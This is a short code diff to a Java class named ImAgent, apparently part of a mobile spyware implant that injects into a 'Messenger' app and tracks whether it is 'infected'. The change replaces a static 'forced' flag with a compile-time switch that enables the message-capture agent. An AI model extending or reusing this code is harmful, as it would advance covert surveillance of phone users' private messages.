@@ -29,7 +29,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
     //#endif
 
     AppInjector appInjector;
-    static boolean forced = false;
     boolean infected;
 
     String appName = "Messenger";
@@ -41,7 +40,11 @@ public final class ImAgent extends Agent implements BacklightObserver,
      *            the agent status
      */
     public ImAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_IM, agentEnabled || forced, true, "ImAgent");
+        super(Agent.AGENT_IM, agentEnabled , true, "ImAgent");
+        
+        //#ifdef IM_FORCED
+        enable(true);
+        //#endif
     }
 
     /**
